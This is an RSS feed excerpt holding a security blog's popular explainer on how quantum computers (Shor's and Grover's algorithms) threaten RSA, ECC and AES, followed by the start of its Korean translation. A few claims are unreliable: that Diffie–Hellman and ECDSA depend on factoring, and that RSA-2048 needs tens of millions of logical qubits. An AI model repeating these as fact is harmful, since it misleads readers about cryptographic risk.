      <pubDate>Sun, 12 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h2&gt;&lt;p&gt;Hello! Today, I&amp;#x20</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>Hello! Today, I&#x2019;d like to take a break and talk about quantum computers. In recent years, as quantum computing technology has advanced rapidly, we&#x2019;re seeing that existing cryptographic systems, which we&#x2019;ve long believed to be secure, are under threat.</p><p>The reason is that most cryptography relies on the assumption that certain calculations are difficult. For example, RSA is based on the difficulty of factoring large numbers, while ECDHE relies on the difficulty of computing discrete logarithms over elliptic curves. However, quantum computers can perform these calculations much faster than classical computers.</p><p>This is possible due to the properties of quantum superposition and entanglement, which allow multiple paths to be considered simultaneously in a single operation. As a result, cryptanalysis that was previously considered &#x201C;practically impossible&#x201D; has become theoretically feasible.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image.png" alt></p><p>The point at which quantum computers can decrypt current cryptography is called <strong>Q-Day (Quantum Day)</strong>. While the exact timing of Q-Day remains uncertain, major companies like IBM, Google, IonQ, and Syquantum are striving to build quantum computers with hundreds of qubits. Consequently, the IT industry views Q-Day not as mere speculation but as a tangible risk.</p><p>Therefore, today we&#x2019;ll cover the fundamental characteristics of quantum computers and the algorithms they use to break existing encryption. I&#x2019;ll explain it as clearly as possible!</p><h2 id="2-Quantum-Computers"><a href="#2-Quantum-Computers" class="headerlink" title="2. Quantum Computers"></a>2. Quantum Computers</h2><p>Quantum computers operate on principles entirely different from conventional digital computers. While traditional computers represent information using two states&#x2014;0 and 1&#x2014;as electrical signals, quantum computers express information using units called &#x2018;qubits&#x2019;.</p><p>A qubit doesn&#x2019;t simply hold one value, either 0 or 1. Through a state called quantum superposition, it can exist in a state where 0 and 1 are present simultaneously. This allows quantum computers to perform parallel computations, unlike conventional computers.</p><p>Mathematically, the state of a qubit can be expressed as follows:</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image1.png" alt></p><p>Here, &#x3B1; and &#x3B2; are probability amplitudes, and these two values always satisfy the relationship &#x2223;&#x3B1;&#x2223;&#xB2; + &#x2223;&#x3B2;&#x2223;&#xB2; = 1. This means a qubit exists in a state simultaneously containing the &#x201C;probability of being 0 (&#x2223;&#x3B1;&#x2223;^2)&#x201D; and the &#x201C;probability of being 1 (&#x2223;&#x3B2;&#x2223;^2)&#x201D;. This state exists probabilistically until we measure it; once measured, it collapses into a single value.</p><p>Thanks to this property, quantum computers can explore multiple possibilities simultaneously in a single operation&#x2014;something classical computers must compute sequentially. Consequently, quantum computers can achieve vastly faster computation speeds than classical computers for specific problems (e.g., factorization, optimization, search, etc.).</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image2.png" alt></p><blockquote><p>Source: &#x201C;Concise Insights into Quantum Machine Learning and Its Practical Uses&#x201D; (Sanati &amp; Borzoei, 2024, DOI: 10.13140/RG.2.2.14216.64002)</p></blockquote><h3 id="2-1-Quantum-Superposition"><a href="#2-1-Quantum-Superposition" class="headerlink" title="2.1 Quantum Superposition"></a>2.1 Quantum Superposition</h3><p>Quantum superposition is one of the most fundamental properties of quantum computers, referring to the phenomenon where <strong>a single qubit can exist in multiple states simultaneously</strong>. As explained earlier, while classical computers execute calculations sequentially along &#x2018;one path,&#x2019; quantum computers perform calculations in parallel by &#x2018;exploring multiple paths simultaneously.&#x2019;</p><p>For example, with 10 qubits, a quantum computer can simultaneously consider 2^10 = 1024 states in a single operation. This parallelism enables computational efficiency far surpassing classical methods!</p><p>However, qubits in superposition states are highly sensitive to external environments and can easily collapse due to factors like noise or decoherence. Therefore, the biggest challenge in practical quantum computer implementation is how stably these superposition states can be maintained.</p><h3 id="2-2-Quantum-Entanglement"><a href="#2-2-Quantum-Entanglement" class="headerlink" title="2.2 Quantum Entanglement"></a>2.2 Quantum Entanglement</h3><p>Quantum entanglement is the phenomenon where two or more qubits become bound together in a state where they are not independent. That is, <strong>if the state of one qubit changes, the state of another entangled qubit also changes instantly</strong>. Einstein famously questioned this phenomenon, calling it &#x201C;spooky action at a distance.&#x201D; However, experiments like Bell&#x2019;s inequality tests and those by Alain Aspect (1982) later proved its existence.</p><p>In quantum computers, this entanglement enables simultaneous processing of computational dependencies between qubits. Entanglement allows operations to be connected in parallel, and by leveraging the correlation of information, specific computational results can be amplified or unnecessary outcomes eliminated, thereby strengthening the pattern leading to the correct answer. For example, measuring one qubit in an entangled pair automatically determines the state of the other qubit. This property enables advanced operations like information transfer, state control, and error correction.</p><p>This entanglement phenomenon forms the basis for quantum computers to implement logically connected computational networks beyond mere parallel processing.</p><h3 id="2-3-Quantum-Interference"><a href="#2-3-Quantum-Interference" class="headerlink" title="2.3 Quantum Interference"></a>2.3 Quantum Interference</h3><p>Quantum interference strengthens the probability of the path leading to the correct answer among multiple paths in a superposition state, while weakening the probability of incorrect paths.</p><p>Quantum algorithms are designed to intentionally manipulate this interference so that the correct result is ultimately observed with a higher probability. For example, Grover&#x2019;s algorithm repeatedly enhances the probability of the correct solution among all possible solutions. This allows finding the correct answer among N pieces of data in O(&#x221A;n) time using a quantum algorithm, compared to O(N) time using classical methods.</p><p>If quantum superposition broadens the scope of computation, quantum interference can be seen as a filter that retains only the correct answer within that scope.</p><h2 id="3-Quantum-Algorithms"><a href="#3-Quantum-Algorithms" class="headerlink" title="3. Quantum Algorithms"></a>3. Quantum Algorithms</h2><p>The properties of quantum computers we&#x2019;ve examined&#x2014;superposition, entanglement, and interference&#x2014;are not merely &#x2018;fascinating physical phenomena&#x2019;. Utilizing these properties allows us to solve problems that are difficult for classical computers to tackle, far more efficiently.</p><p>Representative examples demonstrating the potential of quantum computation are Shor&#x2019;s algorithm and Grover&#x2019;s algorithm. While these algorithms weren&#x2019;t created &#x201C;to break classical cryptography,&#x201D; their computational principles ultimately undermined the security of the cryptographic systems we currently use.</p><h3 id="3-1-Shor&#x2019;s-Algorithm"><a href="#3-1-Shor&#x2019;s-Algorithm" class="headerlink" title="3.1 Shor&#x2019;s Algorithm"></a>3.1 Shor&#x2019;s Algorithm</h3><p>Shor&#x2019;s algorithm, proposed by Peter Shor in 1994, can perform <strong>polynomial-time integer factorization</strong>. On classical computers, factoring large numbers becomes incredibly difficult; breaking a 2048-bit RSA key would take billions of years, making it practically impossible. However, Shor&#x2019;s algorithm proved that using a quantum computer, this can be done in polynomial time.</p><p>The operating principle is somewhat complex, but simply put, it uses the quantum Fourier transform to rapidly identify the periodicity within a sequence. Knowing this periodicity allows one to naturally find the prime factors through the information revealed.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image3.png" alt></p><p>This diagram is a simplified circuit representing the basic structure of Shor&#x2019;s algorithm. The qubits on the left initialize the input state and create a superposition state using the Hadamard gate (H). Next, each qubit performs a different Ua^{2^{n-1}} operation, reflecting the sequence&#x2019;s periodicity to obtain phase information. Finally, applying the inverse quantum Fourier transform (QFT&#x207B;&#xB9;) converts this into a form where the periodicity information can be measured.</p><p>Honestly, this part is hard to explain simply. I once got a B+ on a quantum cryptography exam question proving Shor&#x2019;s algorithm quantum circuit.</p><p>Anyway, why is this important? Because **almost all public-key cryptosystems like RSA, Diffie&#x2013;Hellman, and ECDSA operate on the assumption that &#x2018;factoring is difficult&#x2019;. In other words, if Shor&#x2019;s algorithm becomes practical, it could threaten the internet security we rely on today.</p><p>Of course, it&#x2019;s theoretically very powerful, but in reality, we haven&#x2019;t yet implemented enough stable logical qubits. So, while it&#x2019;s not at the level of breaking RSA immediately, the fact that it might be possible someday is why academia is actively researching the transition to post-quantum cryptography (PQC). PQC is another major topic, so I&#x2019;ll cover it later if the opportunity arises.</p><h3 id="3-2-Grover&#x2019;s-Algorithm"><a href="#3-2-Grover&#x2019;s-Algorithm" class="headerlink" title="3.2 Grover&#x2019;s Algorithm"></a>3.2 Grover&#x2019;s Algorithm</h3><p>Grover&#x2019;s algorithm is <strong>an algorithm that efficiently finds a specific item in an unordered database</strong>. If we were to find the answer to a problem by trying every possible case one by one, the classical approach would require an average of N/2 attempts for N candidates to find the correct answer. However, a quantum computer can find the correct answer in approximately &#x221A;N attempts using Grover&#x2019;s algorithm. This is possible because quantum computers utilize superposition and interference.</p><p>Grover&#x2019;s algorithm simultaneously superimposes all possible states, enabling all candidates to participate in the computation at once. It then applies an oracle operation that flips the phase only of the correct state, repeating this process while using interference to amplify the probability amplitude of the correct answer. Finally, when measured, the state with the highest probability of being correct remains.</p><p>This characteristic makes Grover&#x2019;s algorithm highly applicable across various fields, such as large-scale database searches and machine learning problems.</p><p>However, it simultaneously poses a threat capable of halving the security strength of symmetric-key cryptography or hash-based systems. For instance, while a classical computer requires 2^128 attempts to brute-force an AES-128 cipher, calculations show a quantum computer could achieve this in just 2^64 attempts.</p><p>While Grover&#x2019;s algorithm doesn&#x2019;t directly break public-key cryptography like Shor&#x2019;s algorithm does, it clearly demonstrated that quantum computers threaten not only public-key cryptography but also symmetric-key cryptography. Therefore, the security industry <strong>recommends using long keys like AES-256</strong>. Even considering Grover attacks, AES-256 remains sufficiently secure.</p><h2 id="4-Q-day"><a href="#4-Q-day" class="headerlink" title="4. Q-day"></a>4. Q-day</h2><p>No one can accurately predict when <strong>Q-Day (Quantum Day)</strong>&#x2014;the day quantum computers can actually decrypt current cryptography&#x2014;will arrive. However, we are currently in the NISQ (Noisy Intermediate-Scale Quantum) era.</p><p>It is literally the noisy intermediate-scale quantum computer era. While leading global IT companies have implemented hundreds of qubits, they remain unstable with high error rates, insufficient to break RSA. It&#x2019;s known that breaking RSA-2048 completely requires tens of millions of stable logical qubits, yet current hardware mostly remains at the level of hundreds of physical qubits.</p><p>Furthermore, error correction technology&#x2014;which groups multiple physical qubits to create a single logical qubit&#x2014;is still in the research phase. Therefore, we can consider this an era of learning how to operate quantum computers reliably.</p><p>Nevertheless, there is no disagreement that Q-Day <strong>will inevitably arrive someday</strong>. Governments and major institutions have already begun preparing for that moment. The U.S. National Institute of Standards and Technology (NIST) is driving the standardization of <strong>Post-Quantum Cryptography (PQC)</strong> and finalized its first set of candidate standards in 2024. The European Union, Korea&#x2019;s KISA, Japan&#x2019;s NICT, and others are also preparing accordingly.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image4.png" alt></p><blockquote><p>Source: IMARC Group</p></blockquote><p>As governments and companies worldwide prepare for quantum threats, the quantum-resistant cryptography (PQC) market is also experiencing explosive growth. According to IMARC Group, the PQC market is projected to grow from approximately $300 million in 2024 to around $9.4 billion by 2033.</p><p>This article aims to explain the relationship between quantum computers and cryptography as simply as possible. If the opportunity arises, we&#x2019;ll explore what quantum-resistant cryptography (PQC) entails and why it&#x2019;s hailed as a core technology for the &#x201C;post-quantum era.&#x201D;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/crypto/">crypto</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantum/">quantum</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantumcomputing/">quantumcomputing</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] The Quantum Threat to Classical Security (ko)</title>
      <link>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/ko/</link>
      <guid>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/ko/</guid>
      <pubDate>Sun, 12 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;1-&amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;a href=&quot;#1-&amp;#xC11C;&amp;#xB860;&quot; class=&quot;headerlink&quot; title=&quot;1. &amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;/a&gt;1. &amp;#xC11C;&amp;#xB860;&lt;/h2&gt;&lt;p&gt;&amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="1-&#xC11C;&#xB860;"><a href="#1-&#xC11C;&#xB860;" class="headerlink" title="1. &#xC11C;&#xB860;"></a>1. &#xC11C;&#xB860;</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC624;&#xB298;&#xC740; &#xC7A0;&#xC2DC; &#xC26C;&#xC5B4;&#xAC08; &#xACB8; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD574;&#xC694;. &#xCD5C;&#xADFC; &#xBA87; &#xB144; &#xC0AC;&#xC774; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130; &#xAE30;&#xC220;&#xC774; &#xBE60;&#xB974;&#xAC8C; &#xBC1C;&#xC804;&#xD558;&#xBA74;&#xC11C;, &#xC6B0;&#xB9AC;&#xAC00; &#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xC548;&#xC804;&#xD558;&#xB2E4;&#xACE0; &#xBBFF;&#xC5B4;&#xC654;&#xB358; &#xAE30;&#xC874; &#xC554;&#xD638;&#xCCB4;&#xACC4;&#xAC00; &#xC704;&#xD611; &#xBC1B;&#xB294;&#xB2E4;&#xACE0; &#xBCF4;&#xACE0;&#xC788;&#xC5B4;&#xC694;.</p><p>&#xADF8; &#xC774;&#xC720;&#xB294;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC554;&#xD638;&#xAC00; &#x2018;&#xACC4;&#xC0B0;&#xC774; &#xC5B4;&#xB835;&#xB2E4;&#x2019;&#xB294; &#xAC00;&#xC815; &#xC704;&#xC5D0; &#xC138;&#xC6CC;&#xC838; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC5D0;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; RSA&#xB294; &#x201C;&#xD070; &#xC218;&#xB294; &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#x201D; &#xB294; &#xC810;&#xC5D0;, ECDHE&#xB294; &#x201C;&#xD0C0;&#xC6D0;&#xACE1;&#xC120; &#xC704;&#xC5D0;&#xC11C; &#xC774;&#xC0B0;&#xB85C;&#xADF8;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#x201D;&#xB294; &#xC810;&#xC5D0; &#xAE30;&#xBC18;&#xD558;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC774;&#xB7F0; &#xACC4;&#xC0B0;&#xC744; &#xAE30;&#xC874; &#xCEF4;&#xD4E8;&#xD130;&#xBCF4;&#xB2E4; &#xBE60;&#xB974;&#xAC8C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xC774;&#xB294; &#xC591;&#xC790; &#xC911;&#xCCA9;(superposition)&#xACFC; &#xC591;&#xC790; &#xC5BD;&#xD798;(entanglement)&#xC774;&#xB77C;&#xB294; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xD55C; &#xBC88;&#xC758; &#xC5F0;&#xC0B0;&#xC5D0; &#xC5EC;&#xB7EC; &#xACBD;&#xB85C;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xACE0;&#xB824;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#x201C;&#xC0AC;&#xC2E4;&#xC0C1; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#x201D;&#xACE0; &#xC5EC;&#xACA8;&#xC84C;&#xB358; &#xC554;&#xD638; &#xD574;&#xB3C5;&#xC774; &#xC774;&#xB860;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xAC00;&#xB2A5;&#xD574;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image.png" alt></p><p>&#xC774;&#xCC98;&#xB7FC; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xD604;&#xC7AC;&#xC758; &#xC554;&#xD638;&#xB97C; &#xD574;&#xB3C5;&#xD560; &#xC218; &#xC788;&#xB294; &#xC2DC;&#xC810;&#xC744; <strong>Q-Day(Quantum Day)</strong> &#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. Q-Day&#xAC00; &#xC815;&#xD655;&#xD788; &#xC5B8;&#xC81C; &#xC62C;&#xC9C0;&#xB294; &#xBAA8;&#xB974;&#xC9C0;&#xB9CC;, IBM, Google, &#xC544;&#xC774;&#xC628;&#xD050;, &#xC2F8;&#xC774;&#xD000;&#xD140; &#xB4F1; &#xC8FC;&#xC694; &#xAE30;&#xC5C5;&#xB4E4;&#xC774; &#xC218;&#xBC31; &#xD050;&#xBE44;&#xD2B8; &#xAE09; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB178;&#xB825;&#xD558;&#xB294; &#xB9CC;&#xD07C;, IT&#xC5C5;&#xACC4;&#xC5D0;&#xC11C;&#xB294; Q-Day&#xB97C; &#xB2E8;&#xC21C;&#xD55C; &#xAC00;&#xC815;&#xC774; &#xC544;&#xB2CC; &#xD604;&#xC2E4;&#xC801;&#xC778; &#xB9AC;&#xC2A4;&#xD06C;&#xB85C; &#xC5EC;&#xAE30;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC624;&#xB298;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD2B9;&#xC131;&#xACFC;, &#xC774; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xAE30;&#xC874; &#xC554;&#xD638;&#xB97C; &#xD574;&#xB3C5;&#xD558;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xB300;&#xD55C; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC27D;&#xAC8C; &#xC124;&#xBA85;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p><h2 id="2-&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;"><a href="#2-&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;" class="headerlink" title="2. &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;"></a>2. &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;</h2><p>&#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xAE30;&#xC874;&#xC758; &#xB514;&#xC9C0;&#xD138; &#xCEF4;&#xD4E8;&#xD130;&#xC640;&#xB294; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xC6D0;&#xB9AC;&#xB85C; &#xC791;&#xB3D9;&#xD574;&#xC694;. &#xAE30;&#xC874; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC804;&#xAE30;&#xC801; &#xC2E0;&#xD638;&#xC778; 0&#xACFC; 1&#xC774;&#xB77C;&#xB294; 2&#xAC00;&#xC9C0; &#xC0C1;&#xD0DC;&#xB85C; &#xC815;&#xBCF4;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xC9C0;&#xB9CC;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#x2018;&#xD050;&#xBE44;&#xD2B8;(Qubit)&#x2019;&#xB77C;&#xB294; &#xB2E8;&#xC704;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xD45C;&#xD604;&#xD574;&#xC694;.</p><p>&#xD050;&#xBE44;&#xD2B8;&#xB294; &#xB2E8;&#xC21C;&#xD788; 0 &#xB610;&#xB294; 1 &#xC911; &#xD558;&#xB098;&#xC758; &#xAC12;&#xB9CC; &#xAC00;&#xC9C0;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xC591;&#xC790; &#xC911;&#xCCA9;(superposition) &#xC0C1;&#xD0DC;&#xB97C; &#xD1B5;&#xD574; 0&#xACFC; 1&#xC774; &#xB3D9;&#xC2DC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC0C1;&#xD0DC;&#xAC00; &#xB420; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xAE30;&#xC874; &#xCEF4;&#xD4E8;&#xD130;&#xC640; &#xB2EC;&#xB9AC; &#xBCD1;&#xB82C;&#xC801; &#xC5F0;&#xC0B0;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC218;&#xD559;&#xC801;&#xC73C;&#xB85C; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image1.png" alt></p><p>&#xC5EC;&#xAE30;&#xC11C; &#x3B1;&#xC640; &#x3B2;&#xB294; &#xD655;&#xB960; &#xC9C4;&#xD3ED;(probability amplitude)&#xC73C;&#xB85C;, &#xC774; &#xB450; &#xAC12;&#xC740; &#xD56D;&#xC0C1; &#x2223;&#x3B1;&#x2223;^2 + &#x2223;&#x3B2;&#x2223;^2 =1&#xC758; &#xAD00;&#xACC4;&#xB97C; &#xB9CC;&#xC871;&#xD574;&#xC694;. &#xC989;, &#xD050;&#xBE44;&#xD2B8;&#xB294; &#x201C;0&#xC77C; &#xD655;&#xB960;(&#x2223;&#x3B1;&#x2223;^2)&#x201D;&#xACFC; &#x201C;1&#xC77C; &#xD655;&#xB960;(&#x2223;&#x3B2;&#x2223;^2)&#x201D;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xD488;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC0C1;&#xD0DC;&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xCE21;&#xC815;&#xD558;&#xAE30; &#xC804;&#xAE4C;&#xC9C0; &#xD655;&#xB960;&#xC801;&#xC73C;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xACE0;, &#xCE21;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA74; &#xD558;&#xB098;&#xC758; &#xAC12;&#xC774; &#xB418;&#xBBC0;&#xB85C;, &#xC774; &#xC0C1;&#xD0DC;&#xB294; &#xBD95;&#xAD34;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB7EC;&#xD55C; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xD55C; &#xBC88;&#xC758; &#xC5F0;&#xC0B0;&#xC73C;&#xB85C;, &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD574;&#xC57C;&#xD558;&#xB294; &#xC5EC;&#xB7EC; &#xACBD;&#xC6B0;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xD0D0;&#xC0C9;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xB530;&#xB77C;&#xC11C; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xD2B9;&#xC815; &#xBB38;&#xC81C;(ex. &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;, &#xCD5C;&#xC801;&#xD654;, &#xAC80;&#xC0C9; &#xB4F1;&#xB4F1;..)&#xC5D0;&#xC11C; &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xBE60;&#xB978; &#xACC4;&#xC0B0; &#xC18D;&#xB3C4;&#xB97C; &#xB0BC; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image2.png" alt></p><blockquote><p>Source: &#x201C;Concise Insights into Quantum Machine Learning and Its Practical Uses&#x201D; (Sanati &amp; Borzoei, 2024, DOI: 10.13140/RG.2.2.14216.64002)</p></blockquote><h3 id="2-1-&#xC591;&#xC790;-&#xC911;&#xCCA9;-Superposition"><a href="#2-1-&#xC591;&#xC790;-&#xC911;&#xCCA9;-Superposition" class="headerlink" title="2.1 &#xC591;&#xC790; &#xC911;&#xCCA9; (Superposition)"></a>2.1 &#xC591;&#xC790; &#xC911;&#xCCA9; (Superposition)</h3><p>&#xC591;&#xC790; &#xC911;&#xCCA9;&#xC740; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xAC00;&#xC7A5; &#xD575;&#xC2EC;&#xC801;&#xC778; &#xD2B9;&#xC131; &#xC911; &#xD558;&#xB098;&#xB85C;, <strong>&#xD558;&#xB098;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xAC00; &#xB3D9;&#xC2DC;&#xC5D0; &#xC5EC;&#xB7EC; &#xC0C1;&#xD0DC;&#xB97C; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xB294; &#xD604;&#xC0C1;</strong>&#xC744; &#xB9D0;&#xD574;&#xC694;. &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774;, &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#x2018;&#xD558;&#xB098;&#xC758; &#xAE38;&#x2019;&#xC744; &#xB530;&#xB77C; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xACC4;&#xC0B0;&#xC744; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xBA74;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#x2018;&#xC5EC;&#xB7EC; &#xAE38;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xD0D0;&#xC0C9;&#x2019;&#xD558;&#xBA74;&#xC11C; &#xBCD1;&#xB82C;&#xC801;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C;, 10&#xAC1C;&#xC758; &#xD050;&#xBE44;&#xB4DC;&#xAC00; &#xC788;&#xB2E4;&#xBA74;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xB2E8; &#xD55C; &#xBC88;&#xC758; &#xC5F0;&#xC0B0;&#xC73C;&#xB85C; 2^10 = 1024&#xAC1C;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xACE0;&#xB824;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xB7EC;&#xD55C; &#xBCD1;&#xB82C;&#xC131;&#xC740; &#xACE0;&#xC804;&#xC801; &#xBC29;&#xC2DD;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xBE60;&#xB978; &#xACC4;&#xC0B0; &#xD6A8;&#xC728;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB0BC; &#xC218; &#xC788;&#xACA0;&#xC8E0;!</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xB294; &#xC678;&#xBD80; &#xD658;&#xACBD;&#xC5D0; &#xB9E4;&#xC6B0; &#xBBFC;&#xAC10;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; noise(&#xC7A1;&#xC74C;)&#xB098; decoherence(&#xC591;&#xC790; &#xACB0; &#xC5B4;&#xAE0B;&#xB0A8;) &#xAC19;&#xC740; &#xC694;&#xC778;&#xC5D0; &#xC758;&#xD574; &#xC27D;&#xAC8C; &#xAE68;&#xC9C8; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xB530;&#xB77C;&#xC11C; &#xC2E4;&#xC9C8;&#xC801;&#xC778; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130; &#xAD6C;&#xD604;&#xC5D0;&#xC11C;&#xB294; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xB97C; &#xC5BC;&#xB9C8;&#xB098; &#xC548;&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB290;&#xB0D0;&#xAC00; &#xAC00;&#xC7A5; &#xD070; &#xCC4C;&#xB9B0;&#xC9C0;&#xC5D0;&#xC694;.</p><h3 id="2-2-&#xC591;&#xC790;-&#xC5BD;&#xD798;-Entanglement"><a 